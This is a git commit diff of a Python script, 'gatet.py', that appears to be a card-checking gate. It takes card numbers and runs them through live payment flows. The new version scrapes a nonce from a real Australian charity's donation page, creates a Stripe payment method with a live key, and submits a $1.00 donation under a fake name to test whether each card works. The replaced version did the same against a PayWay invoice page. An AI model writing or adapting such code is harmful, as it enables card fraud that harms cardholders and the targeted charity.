20a27bfeb08a110fe5f27ba83c95e081ace3140a
Kira0621 <genpaypal01@gmail.com>
2025-12-21 08:27:30 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -10,68 +10,130 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 	
+	random_amount1 = random.randint(1, 4)
+	random_amount2 = random.randint(1, 99)
+
 	headers = {
-	    'authority': 'api.payway.com.au',
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'none',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	response = requests.get('https://remember.org.au/donate/', headers=headers)
+	
+	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
+	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
+	
+	headers = {
+	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'authorization': 'Basic UTE4Mzc1X1BVQl8yc3VxNmt4M3pha2JtdTR6dWQ0eDVhM2ZyZG14eXpxOGlpbnoydjZ4emN5cGs1MnR6YWFzN2dwbWp6ZWk6',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://api.payway.com.au',
-	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-no-authenticate-basic': 'true',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = {
-	    'paymentMethod': 'creditCard',
-	    'connectionType': 'FRAME',
-	    'cardNumber': f'{n}',
-	    'cvn': f'{cvc}',
-	    'cardholderName': 'Gen Paypal',
-	    'expiryDateMonth': f'{mm}',
-	    'expiryDateYear': f'{yy}',
-	    'threeDS2': 'false',
-	}
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz'
 	
-	response = requests.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
-	tok = response.json()['singleUseTokenId']
+	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'www.coriowm.com.au',
-	    'accept': '*/*',
+	    'Accept': 'application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://remember.org.au',
+	    'Referer': 'https://remember.org.au/donate/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	data = {
+	    'charitable_form_id': f'{form_id}',
+	    f'{form_id}': '',
+	    '_charitable_donation_nonce': f'{donation_nonce}',
+	    '_wp_http_referer': '/donate/',
+	    'campaign_id': '13890',
+	    'description': 'Donate',
+	    'ID': '0',
+	    'gateway': 'stripe',
+	    'donation_amount': 'custom',
+	    'custom_donation_amount': '1.00',
+	    'title': '',
+	    'first_name': 'Gen',
+	    'last_name': 'Paypal',
+	    'email': 'genpaypal01@gmail.com',
+	    'phone_type': '0',
+	    'phone': '4303000850',
+	    'address': '',
+	    'city': '',
+	    'state': '0',
+	    'postcode': '',
+	    'country': 'AU',
+	    'donation_reason': '',
+	    'stripe_payment_method': f'{pm}',
+	    'action': 'make_donation',
+	    'form_action': 'make_donation',
+	}
+	
+	response = requests.post('https://remember.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
+	
+	try:
+		scrt = response.json().get('secret')
+		if not scrt:
+			return response.text
+		pi = re.search(r"(pi_[^_]+)", scrt)
+		pi = pi.group(1)
+	except Exception:
+		return response.text	
+	
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://www.coriowm.com.au',
-	    'referer': 'https://www.coriowm.com.au/pay-an-invoice/',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
 	    'sec-fetch-dest': 'empty',
 	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = {
-	    'action': 'payway_process_payment',
-	    'nonce': '1e1e4c8be6',
-	    'amount': f'{random_amount1}.{random_amount2}',
-	    'description': 'TEST',
-	    'customer_number': f'{random_amount3}',
-	    'order_number': f'{random_amount3}',
-	    'card_token': f'{tok}',
-	}
+	data = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz&client_attribution_metadata[client_session_id]=ee8d412f-c6a6-47a3-a1ee-1ccae1178a5b&client_attribution_metadata[merchant_integration_source]=l1&client_secret={scrt}'
 	
-	response = requests.post('https://www.coriowm.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post(
+	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
+	    headers=headers,
+	    data=data,
+	)
 	
-	result = response.json()['message']
-	return result
+	return response.text
